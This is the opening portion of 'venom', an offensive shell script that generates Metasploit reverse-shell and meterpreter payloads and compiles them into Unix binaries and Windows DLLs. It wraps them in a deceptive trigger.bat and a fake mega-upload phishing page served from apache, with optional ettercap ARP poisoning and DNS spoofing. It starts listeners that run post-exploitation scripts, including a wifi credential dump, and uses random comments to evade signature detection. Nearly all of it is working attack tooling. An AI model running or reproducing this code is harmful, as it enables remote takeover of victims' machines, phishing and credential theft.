#!/bin/sh
# --------------------------------------------------------------
# venom - metasploit Shellcode generator/compiler/listenner
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.14
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
# codename: Pandora's box (pithos) [ GPL licensed ]
# --------------------------------------------------------------
# [DEPENDENCIES]
# "venom.sh will download/install all dependencies as they are needed"
# Zenity | Metasploit | GCC (unix) |  Pyinstaller (python-to-exe module)
# mingw32 (compile .EXE executables) | pyherion.py (crypter)
# PEScrambler.exe (PE obfuscator/scrambler) | apache2 webserver
# vbs-obfuscator | encrypt_PolarSSL | ettercap (dns_spoof) | WINE
# --------------------------------------------------------------
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 40 90 > /dev/null
# inicio






# ---------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
  echo "[x] we need to be root to run this script..."
  echo "[x] execute [ sudo ./venom.sh ] on terminal"
  exit
else
  :
fi





# ----------------------
# variable declarations
# ----------------------
OS=`uname` # grab OS
H0m3=`echo ~` # grab home path
ver="1.0.14" # script version display
C0d3="Pandora's box (pithos)" # version codename display
user=`who | awk {'print $1'}` # grab username
# user=`who | cut -d' ' -f1 | sort | uniq` # grab username
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd` # grab venom.sh install path (home/username/shell)
# ------------------------------------------------------------------------
# funtions [templates] to be injected with shellcode
# ------------------------------------------------------------------------
Ch4Rs="$IPATH/output/chars.raw" # shellcode raw output path
InJEc="$IPATH/templates/exec.c" # exec script path
InJEc2="$IPATH/templates/exec.py" # exec script path
InJEc3="$IPATH/templates/exec_bin.c" # exec script path
InJEc4="$IPATH/templates/exec.rb" # exec script path
InJEc5="$IPATH/templates/exec_dll.c" # exec script path
InJEc6="$IPATH/templates/hta_attack/exec.hta" # exec script path
InJEc7="$IPATH/templates/hta_attack/index.html" # hta index path
InJEc8="$IPATH/templates/InvokePS1.bat" # invoke-shellcode script path
InJEc9="$IPATH/templates/exec0.py" # exec script path
InJEc10="$IPATH/templates/InvokeMeter.bat" # exec script path
InJEc11="$IPATH/templates/exec.php" # php script path
# phishing webpages to trigger RCE or downloads
InJEc12="$IPATH/templates/phishing/mega.html" # fake webpage script path
InJEc13="$IPATH/templates/phishing/driveBy.html" # fake webpage script path
InJEc14="$IPATH/templates/hta_attack/index.html" # fake webpage script path
InJEc15="$IPATH/templates/exec_psh.c" # c script path
InJEc16="$IPATH/templates/exec.jar" # jar script path




# -------------------------------------------
# SETTINGS FILE FUNTION (venom-main/settings)
# -------------------------------------------
ChEk=`cat settings | egrep -m 1 "MSF_REBUILD" | cut -d '=' -f2` > /dev/null 2>&1
MsFu=`cat settings | egrep -m 1 "MSF_UPDATE" | cut -d '=' -f2` > /dev/null 2>&1
ApAcHe=`cat settings | egrep -m 1 "APACHE_WEBROOT" | cut -d '=' -f2` > /dev/null 2>&1
D0M4IN=`cat settings | egrep -m 1 "MEGAUPLOAD_DOMAIN" | cut -d '=' -f2` > /dev/null 2>&1
DrIvC=`cat settings | egrep -m 1 "WINE_DRIVEC" | cut -d '=' -f2` > /dev/null 2>&1
MsFlF=`cat settings | egrep -m 1 "MSF_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
PyIn=`cat settings | egrep -m 1 "PYTHON_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
PiWiN=`cat settings | egrep -m 1 "PYINSTALLER_VERSION" | cut -d '=' -f2` > /dev/null 2>&1
mSf=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
pHanTom=`cat settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
ArCh=`cat settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1
UUID_RANDOM_LENGTH="70" # build 23 uses random keys (comments) to evade signature detection (default 70)




#
# Config user system correct arch (wine)
#
if [ "$ArCh" = "x86" ]; then
  arch="wine"
  ComP="i586-mingw32msvc-gcc"
else
  arch="wine64"
  ComP="i686-w64-mingw32-gcc"
fi



# -----------------------------------------
# msf postgresql database connection check?
# -----------------------------------------
if [ "$ChEk" = "ON" ]; then
cat << !
    ╔─────────────────────────────────────────────────╗
    |  postgresql metasploit database connection fix  |
    ╚─────────────────────────────────────────────────╝
!

  #
  # start msfconsole to check postgresql connection status
  #
  service postgresql start
  echo "[*] Checking msfdb connection status .."
  ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
  if [ "$ih" != "connected" ]; then
    echo "[x] postgresql selected, no connection .."
    echo "[*] Please wait, rebuilding msf database .."
    # rebuild msf database (database.yml)
    echo ""
    msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
    echo ""
    echo "[✔] postgresql connected to msf .."
    sleep 2
  else
    echo "[✔] postgresql connected to msf .."
    sleep 2
  fi
fi




# -----------------------------------------------
# update metasploit database before running tool?
# -----------------------------------------------
if [ "$MsFu" = "ON" ]; then
cat << !
    ╔─────────────────────────────────────────────────╗
    | please wait fetching latest metasploit modules  |
    ╚─────────────────────────────────────────────────╝
!
  xterm -T " UPDATING MSF DATABASE " -geometry 110x23 -e "msfconsole -x 'msfupdate; exit -y' && sleep 2"
fi



# -----------------------------------------------
# venom framework configurated to store logfiles?
# -----------------------------------------------
if [ "$MsFlF" = "ON" ]; then
cat << !
    ╔─────────────────────────────────────────────────╗
    | venom framework configurated to store logfiles  |
    ╚─────────────────────────────────────────────────╝
!
sleep 2
fi



# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Mint) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}' | cut -d ':' -f2`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear





# ------------------------------------
# end of script internal settings and
# display credits befor running module
# ------------------------------------
cat << !

               __    _ ______  ____   _  _____  ____    __  
              \  \  //|   ___||    \ | |/     \|    \  /  |
               \  \// |   ___||     \| ||     ||     \/   |
                \__/  |______||__/\____|\_____/|__/\__/|__|
                  |S|h|e|l|l|c|0|d|e| |G|e|n|e|r|a|t|0|r|
                    - CodeName: $C0d3 -
!
echo "    ╔────────────────────────────────────────────────────────────────╗"
echo "    |  The author does not hold any responsibility for the bad use   |"
echo "    |  of this tool, remember that attacking targets without prior   |"
echo "    |  consent is illegal and punished by law.                       |"
echo "    |                                                                |"
echo "    |  The main goal of this tool its not to build 'FUD' payloads!   |"
echo "    |  But to give to its users the first glance of how shellcode is |"
echo "    |  build, embedded into one template (any language), obfuscated  |"
echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
echo "    ╠────────────────────────────────────────────────────────────────╝"
echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity(red_team)"
echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R DISTRO:$DiStR0"
echo "" && echo ""
sleep 1
echo "[✔] Toolkit settings:$ArCh arch's"
echo "[☠] Press [ENTER] to continue .."
read op
clear



# -----------------------------------------
# check dependencies (msfconsole + apache2)
# -----------------------------------------
imp=`which msfconsole`
if [ "$?" -eq "0" ]; then
echo "msfconsole found" > /dev/null 2>&1
else
echo ""
echo "[☠] msfconsole -> not found!"
echo "[☠] This script requires msfconsole to work!"
sleep 2
exit
fi


apc=`which apache2`
if [ "$?" -eq "0" ]; then
echo "apache2 found" > /dev/null 2>&1
else
echo ""
echo "[☠] apache2 -> not found!"
echo "[☠] This script requires apache2 to work!"
sleep 2
echo ""
echo "[☠] Please run: cd aux && sudo ./setup.sh"
echo "[☠] to install all missing dependencies..."
exit
fi





# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
echo "[☠] CTRL+C PRESSED -> ABORTING TASKS!"
sleep 1
echo "[☠] Cleanning temp generated files..."
# just in case :D !!!
# revert [templates] backup files to default stages
mv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1
mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
mv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/exec[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1
mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1
mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
# delete temp generated files
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/templates/trigger.raw > /dev/null 2>&1
rm $IPATH/templates/obfuscated.raw > /dev/null 2>&1
rm $IPATH/templates/copy.c > /dev/null 2>&1
rm $IPATH/templates/copy2.c > /dev/null 2>&1
rm $IPATH/templates/final.c > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/sedding.raw > /dev/null 2>&1
rm $IPATH/output/payload.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
rm $IPATH/bin/*.ps1 > /dev/null 2>&1
rm $IPATH/bin/*.vbs > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
# delete temp files from apache webroot
rm $ApAcHe/trigger.bat > /dev/null 2>&1
rm $ApAcHe/trigger.sh > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/*.apk > /dev/null 2>&1
rm $ApAcHe/*.exe > /dev/null 2>&1
rm $ApAcHe/*.py > /dev/null 2>&1
rm $ApAcHe/*.bat > /dev/null 2>&1
rm $ApAcHe/*.deb > /dev/null 2>&1
# delete pyinstaller temp files
rm $IPATH/*.spec > /dev/null 2>&1
rm -r $IPATH/dist > /dev/null 2>&1
rm -r $IPATH/build > /dev/null 2>&1
# delete rtf files
rm /tmp/shell.exe > /dev/null 2>&1
rm $ApAcHe/shell.exe > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
# exit venom.sh
echo "[☠] Exit Shellcode Generator..."
echo "[_Codename:$C0d3]"
echo "☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆"
sleep 1
if [ "$DiStR0" = "Kali" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
cd $IPATH
cd ..
sudo chown -hR $user shell > /dev/null 2>&1
exit
}





# --------------------------------------------
# start metasploit/postgresql/apache2 services
# --------------------------------------------
if [ "$DiStR0" = "Kali" ]; then
service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
else
/etc/init.d/metasploit start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting metasploit service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
/etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
clear


# -------------------------------------------------END OF SCRIPT SETTINGS------------------------------------->








# ---------------------------------------------
# build shellcode in C format
# targets: Apple | BSD | LINUX | SOLARIS
# ---------------------------------------------
sh_shellcode1 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1


# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 420) > /dev/null 2>&1

echo "[☠] Building shellcode -> C format ..."
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C -> UNIX
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # chars.raw | exec.c | gcc compiler
   # check if template exists
   if [ -e $InJEc ]; then
      echo "[☠] exec.c -> found!"
      sleep 2
   else
      echo "[☠] exec.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if gcc exists
   c0m=`which gcc`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] gcc compiler -> found!"
      sleep 2
 
   else

      echo "[☠] gcc compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install gcc"
      echo ""
      sudo apt-get install gcc
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
cp $InJEc $IPATH/templates/exec[bak].c

   # edit exec.c using leafpad or gedit editor
   if [ "$DiStR0" = "Kali" ]; then
      leafpad $InJEc > /dev/null 2>&1
   else
      gedit $InJEc > /dev/null 2>&1
   fi

cd $IPATH/templates
# COMPILING SHELLCODE USING GCC
echo "[☠] Compiling using gcc..."
gcc -fno-stack-protector -z execstack exec.c -o $N4m
mv $N4m $IPATH/output/$N4m

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: sudo ./$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 305) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log  
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else

P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 250) > /dev/null 2>&1



if [ "$P0" = "post_linux.rc" ]; then
# store metasploit post exploit directory structure
CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
  echo "[✔] wifi_dump_linux.rb -> found"
  sleep 2
else
  echo "[x] wifi_dump_linux.rb -> not found"
  sleep 1
  echo "    copy post-module to msfdb .."
  cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
  echo "[☠] Reloading msfdb database .."
  sleep 2
  xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
  xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1

fi
fi



      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi

        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/exec[bak].c $InJEc
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# -----------------------------------------------------------------
# build shellcode in DLL format (windows-platforms)
# mingw32 obfustated using astr0babbys method and build trigger.bat
# to use in winrar/sfx 'make payload executable by pressing on it'
# -----------------------------------------------------------------
sh_shellcode2 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> C format ..."
echo "" > $IPATH/output/chars.raw
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : C -> UNIX
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
cat $IPATH/output/chars.raw
echo "" && echo ""
sleep 2

   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc5 ]; then
      echo "[☠] exec_dll.c -> found!"
      sleep 2
   else
      echo "[☠] exec_dll.c -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

   # check if mingw32 exists
   c0m=`which $ComP`> /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
      echo "[☠] mingw32 compiler -> found!"
      sleep 2
 
   else

      echo "[☠] mingw32 compiler -> not found!"
      echo "[☠] Download compiler -> apt-get install mingw32"
      echo ""
      sudo apt-get install mingw32
      echo ""
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
cp $InJEc5 $IPATH/templates/exec_dll[bak].c
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates
# use SED to replace IpADr3 and P0rT
echo "[☠] Injecting shellcode -> $N4m.dll!"
sleep 2
sed "s|IpADr3|$lhost|g" exec_dll.c > copy.c
sed "s|P0rT|$lport|g" copy.c > copy2.c
mv copy2.c exec_dll.c
rm copy.c

# build winrar-SFX trigger.bat script
echo "[☠] Building winrar/SFX -> trigger.bat..."
sleep 2
echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: this script will run payload using rundll32" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "rundll32.exe $N4m.dll,main" >> $IPATH/output/trigger.bat
echo "exit" >> $IPATH/output/trigger.bat
sleep 2

# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling/obfuscating using mingw32..."
sleep 2
# special thanks to astr0baby for mingw32 -mwindows flag :D
$ComP exec_dll.c -o $N4m.dll -lws2_32 -shared -mwindows
strip $N4m.dll
mv $N4m.dll $IPATH/output/$N4m.dll



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.dll\n$IPATH/output/trigger.bat\n\nExecute on cmd: rundll32.exe $N4m.dll,main\n\nchose how to deliver: $N4m.dll" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
